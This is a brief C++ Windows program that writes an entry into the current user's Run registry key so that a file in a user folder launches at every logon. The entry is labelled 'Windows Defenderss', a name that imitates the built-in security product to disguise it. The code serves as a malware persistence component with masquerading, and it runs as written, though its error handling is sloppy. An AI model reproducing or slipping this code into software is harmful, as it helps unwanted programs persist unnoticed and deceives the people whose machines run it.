#include <stdio.h>
#include<windows.h>

using namespace std;

int main(){
HKEY hkey;
LONG regoOpenResult;
WCHAR PATH[] = L"C:\\Users\\NAME\\testdirect3\\NameOfFile";

regoOpenResult = RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey);

RegSetValueEx(hkey, L"Windows Defenderss", 0, REG_SZ, (LPBYTE)PATH, sizeof(PATH));

RegCloseKey(hkey); 



}






